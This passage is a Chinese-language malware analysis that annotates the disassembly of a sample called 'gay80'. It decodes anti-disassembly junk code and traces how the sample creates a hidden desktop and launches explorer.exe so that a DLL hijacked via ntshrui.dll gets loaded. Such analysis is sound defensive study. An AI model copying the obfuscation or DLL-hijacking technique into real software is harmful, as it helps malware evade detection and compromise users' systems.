
### 00404A7B - 00404A8C

```assembly
00404A7B   .  B8 7C4A4000   MOV EAX,gay80.00404A7C
00404A80   .  0FB7C0       MOVZX EAX,AX
00404A83   .  C1E8 04      SHR EAX,4
00404A86   .  83E8 02      SUB EAX,2
00404A89   .  8B0424       MOV EAX,DWORD PTR SS:[ESP]
00404A8C   .  83C4 04      ADD ESP,4
00404A8F   .  E9 DE020000 JMP gay80.00404D72
```

这里上面看过了，就是调用 `findwindows` 查找 `_CLS_SessionAgent`。

### 00404A94 - 00404AB7（反汇编代码块）

接下来是一段没有反汇编出来的，查机器码得到的：

```assembly
00404A94     85            DB 85
00404A95     C0            DB C0
00404A96     75            DB 75                                   ;  CHAR 'u'
00404A97     1F            DB 1F                                    //jnz 404a97+1f+1=404AB7
00404A98     68            DB 68                                      //PUSH   00404AB7                               ;  CHAR 'h'
00404A99     B74A4000      DD gay80.00404AB7
00404A9D     50            DB 50                                      //PUSH EAX                           ;  CHAR 'P'
00404A9E     B8            DB B8
00404A9F     9F4A4000      DD gay80.00404A9F
00404AA3     0F            DB 0F
00404AA4     B7            DB B7
00404AA5     C0            DB C0                                      //MOVZX EAX,AX
00404AA6     C1            DB C1
00404AA7     E8            DB E8
00404AA8     04            DB 04                                      //shr eax,4
00404AA9     83            DB 83                                      //
00404AAA     E8            DB E8                                      //
00404AAB     02            DB 02                                      //SUB EAX,2
00404AAC     8B            DB 8B
00404AAD     04            DB 04
00404AAE     24            DB 24                                       //MOV EAX,DWORD PTR SS:[ESP]           ;  CHAR '$'
00404AAF     83            DB 83
00404AB0     C4            DB C4                                       //ADD ESP,4
00404AB1  .  04 E9          ADD AL,0E9
00404AB3  .  9B            WAIT
00404AB4  .  F7FF          IDIV EDI
00404AB6  .  FFC9          DEC ECX                                     //JMP gay80.00404252
```

整理下：

```assembly
00404A94     85            DB 85
00404A95     C0            DB C0
00404A96     75 1F         JNZ SHORT gay80.00404AB7
00404A98     68 B74A4000   PUSH gay80.00404AB7
00404A9D     50            PUSH EAX
00404A9E     B8 9F4A4000   MOV EAX,gay80.00404A9F
00404AA3     0FB7C0        MOVZX EAX,AX
00404AA6     C1E8 04       SHR EAX,4
00404AA9     83E8 02       SUB EAX,2
00404AAC     8B0424        MOV EAX,DWORD PTR SS:[ESP]
00404AAF     83C4 04       ADD ESP,4
00404AB2    ^ E9 9BF7FFFF  JMP gay80.00404252
00404AB7   ?  C9           LEAVE
```

跳转到 `404252` 处。

### 00404258 - 00404284

```assembly
00404258   .  8B3424        MOV ESI,DWORD PTR SS:[ESP]
0040425B   .  83C4 04       ADD ESP,4
0040425E   .  29D2          SUB EDX,EDX
00404260   .  52            PUSH EDX
00404261   .  68 00000010   PUSH 10000000
00404266   .  52            PUSH EDX
00404267   .  52            PUSH EDX
00404268   .  52            PUSH EDX
00404269   .  56            PUSH ESI
0040426A   .  68 8A424000   PUSH gay80.0040428A
0040426F   .  50            PUSH EAX
00404270   .  B8 71424000   MOV EAX,gay80.00404271
00404275   .  0FB7C0        MOVZX EAX,AX
00404278   .  C1E8 04       SHR EAX,4
0040427B   .  83E8 02       SUB EAX,2
0040427E   .  8B0424        MOV EAX,DWORD PTR SS:[ESP]
00404281   .  83C4 04       ADD ESP,4
00404284   .- FF25 B6524000 JMP DWORD PTR DS:[<&USER32.CreateDesktopA>]     ;  USER32.CreateDesktopA
```

..创建一个桌面

### 0040428A - 004042C8

```assembly
0040428A   .  09C0          OR EAX,EAX
0040428C   .  0F84 02010000 JE gay80.00404394
00404292   .  68 58010000   PUSH 158
00404297   .  8B0C24        MOV ECX,DWORD PTR SS:[ESP]
0040429A   .  83C4 04       ADD ESP,4
0040429D   .  29CC          SUB ESP,ECX
0040429F   .  89E7          MOV EDI,ESP
004042A1   .  FC            CLD
004042A2   .  31c0          XOR EAX,EAX
004042A4   .  57            PUSH EDI
004042A5   .  F3:AA         REP STOS BYTE PTR ES:[EDI]
004042A7   .  8B3C24        MOV EDI,DWORD PTR SS:[ESP]
004042AA   .  83C4 04       ADD ESP,4
004042AD   .  57            PUSH EDI
004042AE   .  68 CE424000   PUSH gay80.004042CE
004042B3   .  50            PUSH EAX
004042B4   .  B8 B5424000   MOV EAX,gay80.004042B5
004042B9   .  0FB7C0        MOVZX EAX,AX
004042BC   .  C1E8 04       SHR EAX,4
004042BF   .  83E8 02       SUB EAX,2
004042C2   .  8B0424        MOV EAX,DWORD PTR SS:[ESP]
004042C5   .  83C4 04       ADD ESP,4
004042C8   .- FF25 FC504000 JMP DWORD PTR DS:[<&KERNEL32.GetStartupInfoA>]    ;  kernel32.GetStartupInfoA
```

..、、得到进程的一些启动信息，为下面创建进程做准备

### 004042CE - 00404313

```assembly
004042CE   .  8977 08       MOV DWORD PTR DS:[EDI+8],ESI
004042D1   .  C747 2C 81000>MOV DWORD PTR DS:[EDI+2C],81
004042D8   .  8D77 54       LEA ESI,DWORD PTR DS:[EDI+54]
004042DB   .  68 04010000   PUSH 104
004042E0   .  56            PUSH ESI
004042E1   .  68 FD424000   PUSH gay80.004042FD                  ;  ASCII "%windir%\\explorer.exe"
004042E6   .  50            PUSH EAX
004042E7   .  B8 E8424000   MOV EAX,gay80.004042E8
004042EC   .  0FB7C0        MOVZX EAX,AX
004042EF   .  C1E8 04       SHR EAX,4
004042F2   .  83E8 02       SUB EAX,2
004042F5   .  8B0424        MOV EAX,DWORD PTR SS:[ESP]
004042F8   .  83C4 04       ADD ESP,4
004042FB   .  EB 16         JMP SHORT gay80.00404313//call 下面
004042FD   .  25 77 69 6E 6>ASCII "%windir%\\explore"
0040430D   .  72 2E 65 78 6>ASCII "r.exe",0
00404313   >  68 33434000   PUSH gay80.00404333
```

### 00404318 - 0040432D

```assembly
00404318   .  50            PUSH EAX
00404319   .  B8 1A434000   MOV EAX,gay80.0040431A
0040431E   .  0FB7C0        MOVZX EAX,AX
00404321   .  C1E8 04       SHR EAX,4
00404324   .  83E8 02       SUB EAX,2
00404327   .  8B0424        MOV EAX,DWORD PTR SS:[ESP]
0040432A   .  83C4 04       ADD ESP,4
0040432D   .- FF25 E8504000 JMP DWORD PTR DS:[<&KERNEL32.ExpandEnvironmentStr>;  kernel32.ExpandEnvironmentStringsA
```

//注册 `%windir%\\explorer.exe` 为系统环境变量

### 00404333 - 00404360

```assembly
00404333   .  8D47 44       LEA EAX,DWORD PTR DS:[EDI+44]
00404336   .  29D2          SUB EDX,EDX
00404338   .  50            PUSH EAX
00404339   .  57            PUSH EDI
0040433A   .  52            PUSH EDX
0040433B   .  52            PUSH EDX
0040433C   .  68 00084000   PUSH gay80.00400800
00404341   .  52            PUSH EDX
00404342   .  52            PUSH EDX
00404343   .  52            PUSH EDX
00404344   .  56            PUSH ESI
00404345   .  52            PUSH EDX
00404346   .  68 66434000   PUSH gay80.00404366
0040434B   .  50            PUSH EAX
0040434C   .  B8 4D434000   MOV EAX,gay80.0040434D
00404351   .  0FB7C0        MOVZX EAX,AX
00404354   .  C1E8 04       SHR EAX,4
00404357   .  83E8 02       SUB EAX,2
0040435A   .  8B0424        MOV EAX,DWORD PTR SS:[ESP]
0040435D   .  83C4 04       ADD ESP,4
00404360   .- FF25 DC504000 JMP DWORD PTR DS:[<&KERNEL32.CreateProcessA>]     ;  kernel32.CreateProcessA
```

//以 `C:\\WINDOWS\\explorer.exe` 为参数创建进程，创建进程后便于加载相应的 `dll`，前面已经将 `ntshrui.dll` 映射了相关的 `dll`

//这样这个 `dll` 就会在新的 `explorer` 中加载了

### 00404366 - 00404388

```assembly
00404366   .  68 70170000   PUSH 1770
0040436B   .  FF77 48       PUSH DWORD PTR DS:[EDI+48]
0040436E   .  68 8E434000   PUSH gay80.0040438E
00404373   .  50            PUSH EAX
00404374   .  B8 75434000   MOV EAX,gay80.00404375
00404379   .  0FB7C0        MOVZX EAX,AX
0040437C   .  C1E8 04       SHR EAX,4
0040437F   .  83E8 02       SUB EAX,2
00404382   .  8B0424        MOV EAX,DWORD PTR SS:[ESP]
00404385   .  83C4 04       ADD ESP,4
00404388   .- FF25 1C514000 JMP DWORD PTR DS:[<&KERNEL32.WaitForSingleObject>>;  kernel32.WaitForSingleObject
```

//等待创建的进程一段时间

### 0040438E - 00404AB9

```assembly
0040438E   .  81C4 58010000 ADD ESP,158
00404394   >  61            POPAD
00404395   .  C3            RETN
```

//返回到下面代码后，便释放分配的内存，然后便退出进程了

```assembly
00404AB8   .  57            PUSH EDI
00404AB9   .  68 D94A4000   PUSH gay80.00404AD9
```
